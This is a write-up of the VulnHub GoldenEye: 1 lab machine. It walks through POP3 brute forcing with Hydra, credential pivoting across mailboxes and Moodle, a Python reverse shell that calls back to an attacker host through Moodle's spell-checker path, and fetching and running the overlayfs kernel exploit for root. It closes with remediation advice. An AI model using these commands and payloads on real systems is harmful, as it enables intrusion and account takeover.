# GoldenEye: 1 Write-up

> **Platform:** VulnHub, [GoldenEye: 1](https://www.vulnhub.com/entry/goldeneye-1,240/) **Machine:** GoldenEye: 1 **Difficulty:** Intermediate **Operating System:** Ubuntu Linux **Author:** creosote

---
## Overview

GoldenEye: 1 is a James Bond themed box built around a long chain of credential discovery across email, POP3, and a Moodle installation, before finishing with a well-known kernel exploit. There is no single vulnerability that opens the door here. Instead, the entire attack path is a sequence of small leads (an encoded password in a JavaScript file, mail accounts reachable through POP3, a leaked admin password hidden in an image's metadata) that each unlock the next stage.

---
## Attack Path

1. Enumerated open services with Nmap, finding SMTP, HTTP, and two mail-related ports.
2. Found an encoded password for a user, `boris`, inside a JavaScript file on the site.
3. Logged into the web application and found a hint pointing at a non-default POP3 port.
4. Brute forced `boris`'s POP3 password after his web password failed to work there.
5. Read `boris`'s mail and discovered another valid username, `natalya`.
6. Brute forced `natalya`'s POP3 password and read her mail, finding credentials for a third user, `xenia`, along with a hostname to add to the local hosts file.
7. Logged into a Moodle site as `xenia` and found a reference to a fourth user, `doak`.
8. Brute forced `doak`'s POP3 password and recovered his Moodle credentials from his mail.
9. Logged in as `doak` and found a note pointing toward an image containing hidden credentials.
10. Extracted metadata from the image to recover the Moodle admin password.
11. Logged in as admin and used a known Moodle spell-checker misconfiguration to achieve remote code execution.
12. Escalated privileges using a known kernel exploit after finding no working C compiler except `cc`.
13. Retrieved the final flag.

---
## Initial Enumeration

```bash
nmap -p- -sC -sV -T5 goldeneye
```

```text
25/tcp    open  smtp        Postfix smtpd
80/tcp    open  http        Apache httpd 2.4.7 (Ubuntu)
|_http-title: GoldenEye Primary Admin Server
55006/tcp open  ssl/unknown
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
55007/tcp open  pop3        Dovecot pop3d
```

Four ports of interest: SMTP, HTTP, and a Dovecot mail service split across two non-standard ports, one of them the actual POP3 port.

---
## Web Enumeration

```bash
whatweb -a 3 http://goldeneye
```

This confirmed an Apache server running on Ubuntu, with nothing further revealed. Directory brute forcing and Nikto scans against the site didn't return anything useful either, so I moved to manual inspection instead. The homepage referenced a login area at `/sev-home/`, but no credentials were available yet.

---
## Finding the First Credential

Checking the page source led to a JavaScript file, `terminal.js`, which contained a comment left for a user named `boris`, along with an HTML-entity encoded password:

```text
Boris, make sure you update your default password.
My sources say MI6 maybe planning to infiltrate.
Be on the lookout for any suspicious network traffic....

I encoded you p@ssword below...

&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;

BTW Natalya says she can break your codes
```

Decoding the entities (via CyberChef) revealed:

```text
boris : InvincibleHack3r
```

The comment also confirmed a second username, `natalya`, worth remembering for later.

---
## Logging Into the Web Application

Using these credentials at `/sev-home/` logged in successfully, revealing a message about a "GoldenEye Network Operator" program, and a specific hint:

```text
Remember, since security by obscurity is very effective, we have configured our
pop3 service to run on a very high non-default port
```

This pointed directly at port 55007, already identified during the Nmap scan as running POP3.

---
## Accessing Boris's Mail

I first tried Boris's web password directly against POP3:

```bash
nc -nv 192.168.56.114 55007
USER boris
PASS InvincibleHack3r
```

```text
-ERR [AUTH] Authentication failed.
```

The web and mail passwords didn't match, so I brute forced it instead, using a smaller, curated wordlist rather than a massive general-purpose one:

```bash
hydra -l boris -P /usr/share/wordlists/fasttrack.txt -f goldeneye -s 55007 pop3
```

This recovered a working POP3 password: `secret1!`. Logging in and reading Boris's mail (`RETR 1`, `RETR 2`, `RETR 3`) confirmed `natalya` as a valid account and mentioned a third user, `xenia`, gaining access to a training site.

---
## Accessing Natalya's Mail

```bash
hydra -l natalya -P /usr/share/wordlists/fasttrack.txt -f goldeneye -s 55007 pop3
```

This recovered `natalya : bird`. Her mailbox contained Moodle credentials for `xenia`:

```text
username: xenia
password: RCP90rulez!
```

It also referenced an internal domain, `severnaya-station.com`, and instructed adding it to the local hosts file:

```bash
sudo nano /etc/hosts
```

```text
192.168.56.114 severnaya-station.com
```

---
## Logging Into Moodle

Visiting the domain revealed an old Moodle installation. Logging in as `xenia` surfaced a message from another user, `dr_doak`, whose email username was given directly as `doak`. The message also mentioned that additional courses would appear later, though none were visible yet.

---
## Accessing Doak's Mail

```bash
hydra -l doak -P /usr/share/wordlists/fasttrack.txt -f severnaya-station.com -s 55007 pop3
```

This recovered `doak : goat`. His mailbox contained working Moodle credentials:

```text
username: dr_doak
password: 4England!
```

---
## Finding the Admin Password

Logging in as `dr_doak`, his private files section contained a file intended for another user:

```text
For James
    s3cret.txt
```

Its contents pointed toward an image containing further hidden data:

```text
I was able to capture this apps adm1n cr3ds through clear txt.

Text throughout most web apps within the GoldenEye servers are scanned, so I
cannot add the cr3dentials here.

Something juicy is located here: /dir007key/for-007.jpg
```

I downloaded the image directly:

```bash
curl http://severnaya-station.com/dir007key/for-007.jpg -o for-007.jpg
```

Then examined its metadata:

```bash
exiftool for-007.jpg
```

The description field contained an encoded string. Decoding it (via CyberChef) revealed the Moodle admin password:

```text
xWinter1995x!
```

---
## Gaining Remote Code Execution

Logging in as `admin : xWinter1995x!` gave full administrative access to Moodle. Rather than searching blindly for a way to execute code, I researched known Moodle privilege escalation techniques and found that Moodle's built-in spell checker integration (Aspell) can be abused to execute arbitrary commands, if an admin points the spell checker path at a malicious script instead of the real binary.

The relevant setting is under:

```text
Site Administration -> Server -> System Paths
```

I set the spell checker path to a Python-based reverse shell payload:

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

After saving the path, I changed the active spell checker engine to `PSpellShell` (found by searching "engine" in the admin settings search bar), started a listener, and triggered the spell checker by adding a new blog entry and clicking its spell check icon:

```bash
nc -nlvp 4444
```

The listener caught a shell as `www-data`.

---
## Stabilizing the Shell

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
export TERM=xterm
```

Followed by backgrounding and resetting the terminal for a fully interactive session:

```bash
Ctrl+Z
stty raw -echo; fg; reset
```

---
## Privilege Escalation

Standard checks (`sudo -l`, SUID binaries, `uname -a`) pointed toward an outdated kernel as the most promising path:

```text
3.13.0-32-generic
```

```text
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation | linux/local/37292.c
```

```bash
searchsploit -m linux/local/37292.c
```

Before transferring the exploit, I checked for a C compiler on the target and found that `gcc` was not installed:

```text
The program 'gcc' is currently not installed. To run 'gcc' please ask your
administrator to install the package 'gcc'
```

`cc`, the default system compiler alias (typically pointing to `gcc` or `clang`), was available instead. This required two small adjustments: compiling with `cc` directly, and editing a line inside the exploit source that explicitly called `gcc`:

```c
lib = system("cc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w");
```

I served the exploit file from my attacking machine and pulled it onto the target:

```bash
python3 -m http.server 8000
curl http://192.168.56.1:8000/37292.c -o /tmp/37292.c
```

Then compiled and ran it:

```bash
cc 37292.c -o ofs
chmod +x ofs
./ofs
```

The compilation produced warnings, which were not fatal. Running the resulting binary escalated straight to root.

---
## Final Flag

```bash
cd /root
ls -la
```

```text
Alec told me to place the codes here:

568628e0d993b1973adc718237da6e93

If you captured this make sure to go here.....
/006-final/xvf7-flag/
```

Following the referenced path in a browser confirmed the final success message:

```text
http://severnaya-station.com/006-final/xvf7-flag/
```

Machine complete.

---
## Flags Summary

|Flag|Location|How It Was Found|
|---|---|---|
|Final|`/root` and `/006-final/xvf7-flag/`|Retrieved after kernel exploit privilege escalation, confirmed via a follow-up web path|

GoldenEye: 1 uses a single final flag rather than a multi-flag structure, but the path there runs through four separate user accounts.

---
## Remediation

- **Never leave encoded credentials in client-side JavaScript or HTML comments.** Encoding is not encryption, and anyone reviewing page source will find it immediately.
- **Do not reuse or hint at usernames across services.** Multiple accounts here were discovered simply by reading mail intended for someone else.
- **Running a service on a non-default port is not a security control.** POP3 on port 55007 was found in the very first Nmap scan, "security by obscurity" provided no actual protection.
- **Enforce account lockout or rate limiting on POP3 and any other authentication service**, since every account compromised here fell to an unthrottled Hydra brute force.
- **Never send plaintext passwords over email**, and never hide credentials in image metadata as a workaround for content scanning. Both are trivially discoverable once an attacker has a reason to look.
- **Disable or tightly restrict Moodle's spell checker path configuration**, or any admin setting that allows pointing at an arbitrary executable. This is a well-documented Moodle post-authentication RCE vector.
- **Ensure system compilers are not installed on production systems** where they serve no legitimate purpose. Their absence here only delayed the final exploit, since `cc` was still available as a substitute.
- **Patch the kernel.** As with earlier boxes in the broader collection, an outdated kernel with a public overlayfs exploit was the final and most direct path to root.

---
## Lessons Learned
- A single box can involve several completely separate credential chains. Tracking every username and password found along the way, even ones that don't work immediately, pays off later.
- Reading other people's mail (in a lab setting) is often the single most productive enumeration step on boxes structured like this one.
- Image metadata (EXIF data) is a legitimate and frequently overlooked place to hide or find sensitive information.
- Not every environment will have the expected tool available. Checking for `gcc` before assuming it exists, and knowing `cc` as a fallback, avoided a dead end during privilege escalation.
- CTF-style boxes sometimes require researching application-specific privilege escalation techniques (like Moodle's spell checker abuse) rather than relying purely on generic exploitation tooling.

---
## Tools Used
- Nmap
- WhatWeb
- CyberChef
- Netcat
- Hydra
- ExifTool
- Searchsploit
- Python (HTTP server and reverse shell)

---
## Technologies Encountered
- Apache 2.4.7
- Postfix SMTP
- Dovecot POP3
- Moodle
- Ubuntu Linux
- Linux kernel 3.13.0

---
## Skills Practiced
- Network Enumeration
- Manual Web Enumeration
- Encoding and Decoding (HTML entities, CyberChef)
- POP3 Credential Brute Forcing
- Multi-Account Pivoting
- Metadata Analysis (EXIF)
- Moodle Post-Authentication Exploitation
- Linux Kernel Privilege Escalation